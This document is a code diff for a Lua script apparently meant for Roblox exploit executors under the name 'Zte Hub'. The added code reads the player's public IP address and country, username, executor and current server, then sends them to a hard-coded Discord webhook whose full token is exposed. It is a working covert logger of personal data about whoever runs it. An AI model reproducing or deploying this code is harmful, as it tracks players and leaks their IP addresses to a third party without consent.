@@ -1,9 +1,45 @@
 local HttpService        = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local WebhookUrl         = "https://discord.com/api/webhooks/…"
+local WebhookUrl         = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
 
--- … (executor detection + IP lookup remain the same) …
+-- 1) Robust executor detection
+local executorName = "UnknownExecutor"
+if pcall(function() return identifyexecutor() end) then
+    local detected = identifyexecutor()
+    if type(detected) == "string" and #detected > 0 then
+        executorName = detected
+    end
+end
 
+-- 2) Fetch public IP + country (or “Unknown” if it fails)
+local function getIPInfo()
+    local ok, response = pcall(function()
+        return HttpService:GetAsync("https://api.myip.com/")
+    end)
+    if not ok or type(response) ~= "string" then
+        return "Unknown", "Unknown"
+    end
+
+    local success, data = pcall(function()
+        return HttpService:JSONDecode(response)
+    end)
+    if not success or type(data) ~= "table" or not data.country or not data.ip then
+        return "Unknown", "Unknown"
+    end
+
+    return data.country, data.ip
+end
+
+-- 3) Fetch the “true” published game name from MarketplaceService using current game.PlaceId
+local gameName
+local success = pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset).Name
+end)
+if not success then
+    gameName = "Unknown Game"
+end
+
+-- 4) Build the embed payload
 local function buildWebhookPayload()
     local player      = game.Players.LocalPlayer
     local displayName = (player and player.DisplayName) or "Not Available"
@@ -13,48 +49,57 @@ local function buildWebhookPayload()
     local placeId = tostring(game.PlaceId or 0)
     local jobId   = tostring(game.JobId or "")
 
-    -- Prevent Discord from auto‐wrapping “TeleportToPlaceInstance(…)”
+    -- Insert a zero‐width space (U+200B) right before "(" so Discord won't wrap inside the function name
     local zeroWidth = "\u200B"
-    local joinScript =
+    local joinScript = 
         "game:GetService('TeleportService'):TeleportToPlaceInstance" .. zeroWidth ..
         "(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Fetch country + IP (or “Unknown” if it fails)
-    local country, ipAddr = getIPInfo()  -- assume getIPInfo() is defined above
-
-    -- <<< Here’s the one‐liner to get the *true* published name >>>
-    local success, productInfo = pcall(function()
-        return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-    end)
-    local gameName = (success and productInfo and productInfo.Name)
-                     and productInfo.Name
-                     or "Unknown Game"
+    local country, ipAddr = getIPInfo()
 
     local embeds = {
         {
-            author = { name = "Zte Hub Server" },
+            author = {
+                name = "Zte Hub Server",
+            },
             title  = userName .. " | " .. displayName,
             type   = "rich",
             color  = tonumber(0x00FF00),
 
             thumbnail = {
                 url = 
-                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
-                  .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
+                  "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
             },
 
             fields = {
-                { name = "Executor:",   value = tostring(executorName), inline = false },
-                { name = "Country:",    value = tostring(country),      inline = false },
-                { name = "IP Address:", value = tostring(ipAddr),       inline = false },
-                { name = "Game Name:",  value = tostring(gameName),     inline = false },
+                {
+                    name  = "Executor:",
+                    value = tostring(executorName),
+                    inline = false,
+                },
+                {
+                    name  = "Country:",
+                    value = tostring(country),
+                    inline = false,
+                },
+                {
+                    name  = "IP Address:",
+                    value = tostring(ipAddr),
+                    inline = false,
+                },
+                {
+                    name  = "Game Name:",
+                    value = tostring(gameName),
+                    inline = false,
+                },
             },
         },
         {
             title       = "Join Server Script",
             description = "```lua\n" .. joinScript .. "\n```",
             color       = tonumber(0x00FF00),
-        },
+        }
     }
 
     return {
@@ -65,4 +110,23 @@ local function buildWebhookPayload()
     }
 end
 
--- … (sendWebhook() logic follows) …
+-- 5) Send the webhook, preferring syn.request() or falling back
+local function sendWebhook()
+    local requestData = buildWebhookPayload()
+
+    if syn and typeof(syn.request) == "function" then
+        syn.request(requestData)
+        return
+    end
+
+    local fallbackRequester = http_request or request or http.request or HttpPost
+    if typeof(fallbackRequester) == "function" then
+        fallbackRequester(requestData)
+        return
+    end
+
+    warn("No supported HTTP‐request function found! Cannot send webhook.")
+end
+
+-- Run it
+sendWebhook()
